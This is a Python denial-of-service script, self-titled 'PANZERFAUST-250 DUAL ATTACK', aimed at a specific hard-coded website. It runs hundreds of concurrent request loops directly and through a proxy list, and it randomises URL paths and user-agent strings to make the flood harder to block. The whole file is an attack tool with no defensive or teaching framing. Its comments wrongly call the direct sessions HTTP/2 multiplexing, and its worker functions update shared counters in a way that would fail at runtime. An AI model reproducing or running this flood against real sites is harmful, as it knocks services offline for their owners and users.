import asyncio
import aiohttp
import sys
import signal
import random
import time

# ================= CONFIG =================
TARGET = "https://sts-network.vercel.app/"  # TARGET SET
PROXY_FILE = "proxies.txt"
# Connection limits
DIRECT_CONNECTIONS = 5      # HTTP/2 connections WITHOUT proxies
PROXY_CONNECTIONS = 20      # HTTP/1.1 connections WITH proxies
PROXY_CONCURRENT_LIMIT = 500  # Max concurrent per ALL proxies
DIRECT_STREAMS_PER_CONN = 100 # Streams per HTTP/2 connection
# ==========================================

running = True
total_requests = 0
last_status = 200
last_log_time = time.time()
proxy_semaphore = None  # To limit total proxy concurrency

# ================= LOGGING =================
def log_status():
    global last_log_time, total_requests, last_status
    current_time = time.time()
    if current_time - last_log_time >= 10:
        last_log_time = current_time
        formatted_reqs = f"{total_requests:,}"
        
        status_color = '\033[91m'  # Red for ERR
        if 200 <= last_status < 300:
            status_color = '\033[92m'  # Green
        elif 300 <= last_status < 400:
            status_color = '\033[93m'  # Yellow
        
        status_text = str(last_status) if last_status != 0 else "ERR"
        print(f"\033[96mPANZERFAUST-250\033[0m:\033[92m{formatted_reqs}\033[0m ----> {status_color}{status_text}\033[0m")

# ================= PROXY HANDLING =================
def load_proxies():
    proxies = []
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except:
        pass
    
    if not proxies:
        print("[!] No proxies loaded - proxy attack disabled")
    
    return proxies

# ================= DIRECT HTTP/2 MULTIPLEX (NO PROXIES) =================
async def direct_h2_attack():
    """HTTP/2 multiplex attack without proxies"""
    global total_requests, last_status
    
    # Create HTTP/2 connections
    connectors = []
    for i in range(DIRECT_CONNECTIONS):
        try:
            connector = aiohttp.TCPConnector(
                limit=0,
                force_close=True,
                enable_cleanup_closed=True,
                ssl=False
            )
            timeout = aiohttp.ClientTimeout(total=10)
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={'User-Agent': get_random_ua()}
            )
            connectors.append(session)
        except:
            pass
    
    print(f"[+] Direct HTTP/2: {len(connectors)} connections")
    
    # Attack function
    async def send_h2_request(session):
        while running:
            try:
                path = random.choice([
                    '/', f'/api/{random.randint(1,9999)}',
                    f'/data/{random.randint(1000,9999)}',
                    f'/users/{random.randint(1,100000)}'
                ])
                
                async with session.get(TARGET + path) as resp:
                    last_status = resp.status
                    total_requests += 1
                    await resp.read()
            except aiohttp.ClientError as e:
                total_requests += 1
                last_status = 0
            except:
                total_requests += 1
                last_status = 0
    
    # Start streams on each connection
    tasks = []
    for session in connectors:
        # Create multiple streams per connection
        for _ in range(DIRECT_STREAMS_PER_CONN):
            tasks.append(asyncio.create_task(send_h2_request(session)))
    
    # Wait for all tasks
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Cleanup
    for session in connectors:
        await session.close()

# ================= PROXY HTTP/1.1 FLOOD (LIMITED) =================
async def proxy_h1_attack(proxies):
    """HTTP/1.1 flood through proxies with strict limits"""
    global total_requests, last_status, proxy_semaphore
    
    if not proxies:
        return
    
    print(f"[+] Proxy HTTP/1.1: {len(proxies)} proxies, {PROXY_CONCURRENT_LIMIT} max concurrent")
    
    # Create semaphore to limit total concurrent proxy requests
    proxy_semaphore = asyncio.Semaphore(PROXY_CONCURRENT_LIMIT)
    
    # Distribute connections across proxies
    connections_per_proxy = PROXY_CONNECTIONS // len(proxies)
    remainder = PROXY_CONNECTIONS % len(proxies)
    
    # Create sessions
    proxy_sessions = []
    for i, proxy in enumerate(proxies):
        connections = connections_per_proxy + (1 if i < remainder else 0)
        for _ in range(connections):
            try:
                connector = aiohttp.TCPConnector(
                    limit=1,  # 1 connection per session for proxies
                    force_close=True,
                    ssl=False
                )
                session = aiohttp.ClientSession(
                    connector=connector,
                    headers={'User-Agent': get_random_ua()}
                )
                proxy_sessions.append((session, proxy))
            except:
                pass
    
    print(f"[+] Proxy sessions created: {len(proxy_sessions)}")
    
    async def send_proxy_request(session, proxy):
        while running:
            async with proxy_semaphore:  # Enforce global limit
                try:
                    path = random.choice([
                        '/', f'/page{random.randint(1,99)}',
                        f'/item/{random.randint(100,999)}',
                        f'/category/{random.randint(1,20)}'
                    ])
                    
                    async with session.get(
                        TARGET + path,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        last_status = resp.status
                        total_requests += 1
                        await resp.read()
                except aiohttp.ClientError as e:
                    total_requests += 1
                    last_status = 0
                except:
                    total_requests += 1
                    last_status = 0
            
            # Small delay to respect proxy limits
            await asyncio.sleep(0.01)
    
    # Start proxy workers
    tasks = []
    for session, proxy in proxy_sessions:
        tasks.append(asyncio.create_task(send_proxy_request(session, proxy)))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Cleanup
    for session, _ in proxy_sessions:
        await session.close()

# ================= UTILS =================
def get_random_ua():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ]
    return random.choice(agents)

async def log_worker():
    """Log status every 10 seconds"""
    global running
    while running:
        log_status()
        await asyncio.sleep(10)

# ================= MAIN =================
async def main():
    global running
    
    print(f"\033[95m[*] PANZERFAUST-250 DUAL ATTACK\033[0m")
    print(f"\033[93m[*] Target: {TARGET}\033[0m")
    print(f"\033[93m[*] Direct HTTP/2: {DIRECT_CONNECTIONS} connections\033[0m")
    print(f"\033[93m[*] Proxy HTTP/1.1: {PROXY_CONNECTIONS} connections\033[0m")
    print("-" * 50)
    
    # Load proxies
    proxies = load_proxies()
    
    # Start all attack components
    tasks = []
    
    # 1. Logging worker
    tasks.append(asyncio.create_task(log_worker()))
    
    # 2. Direct HTTP/2 attack (no proxies)
    tasks.append(asyncio.create_task(direct_h2_attack()))
    
    # 3. Proxy HTTP/1.1 attack (if proxies available)
    if proxies:
        tasks.append(asyncio.create_task(proxy_h1_attack(proxies)))
    
    # Wait for all tasks
    await asyncio.gather(*tasks, return_exceptions=True)

def signal_handler(sig, frame):
    global running
    print(f"\n\033[91m[!] Stopping attack...\033[0m")
    running = False

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    if not TARGET.startswith(('http://', 'https://')):
        print("\033[91m[!] Invalid target URL\033[0m")
        sys.exit(1)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\033[91m[!] Stopped\033[0m")
    finally:
        print(f"\033[95m[*] Total requests: {total_requests:,}\033[0m")
